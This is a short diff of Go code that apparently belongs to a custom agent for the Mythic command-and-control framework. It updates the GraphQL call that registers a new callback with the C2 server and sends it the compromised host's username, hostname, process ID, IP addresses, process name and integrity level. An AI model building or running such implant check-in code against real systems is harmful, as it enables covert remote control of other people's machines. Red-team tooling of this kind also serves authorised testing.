@@ -305,20 +305,10 @@ func registerWithMythic() error {
         user, _ := user.Current()
         
         query := `
-        mutation createCallback($payload_uuid: String!, $c2_profile: String!, $user: String!, $host: String!, $pid: Int!, $ip: String!, $external_ip: String!, $process_name: String!, $integrity_level: Int!, $os: String!, $domain: String!, $architecture: String!) {
+        mutation createCallback($payloadUuid: String!, $newCallback: newCallbackConfig!) {
                 createCallback(
-                        payload_uuid: $payload_uuid,
-                        c2_profile: $c2_profile,
-                        user: $user,
-                        host: $host,
-                        pid: $pid,
-                        ip: $ip,
-                        external_ip: $external_ip,
-                        process_name: $process_name,
-                        integrity_level: $integrity_level,
-                        os: $os,
-                        domain: $domain,
-                        architecture: $architecture
+                        payloadUuid: $payloadUuid,
+                        newCallback: $newCallback
                 ) {
                         status
                         id
@@ -327,18 +317,19 @@ func registerWithMythic() error {
         }`
         
         variables := map[string]interface{}{
-                "payload_uuid":     "9df7dfc4-f21d-4b03-9962-9f3272669b85",
-                "c2_profile":       "HTTP",
-                "user":             user.Username,
-                "host":             hostname,
-                "pid":              os.Getpid(),
-                "ip":               "192.168.1.100",
-                "external_ip":      "203.0.113.1",
-                "process_name":     "phantom_advanced.exe",
-                "integrity_level":  2,
-                "os":               fmt.Sprintf("%s %s", runtime.GOOS, runtime.GOARCH),
-                "domain":           "WORKGROUP",
-                "architecture":     runtime.GOARCH,
+                "payloadUuid": "9df7dfc4-f21d-4b03-9962-9f3272669b85",
+                "newCallback": map[string]interface{}{
+                        "c2_profile":       "HTTP",
+                        "user":             user.Username,
+                        "host":             hostname,
+                        "pid":              os.Getpid(),
+                        "ip":               "192.168.1.100",
+                        "external_ip":      "203.0.113.1",
+                        "process_name":     "phantom_advanced.exe",
+                        "integrity_level":  2,
+                        "os":               fmt.Sprintf("%s %s", runtime.GOOS, runtime.GOARCH),
+                        "architecture":     runtime.GOARCH,
+                },
         }
         
         resp, err := makeGraphQLRequest(query, variables)
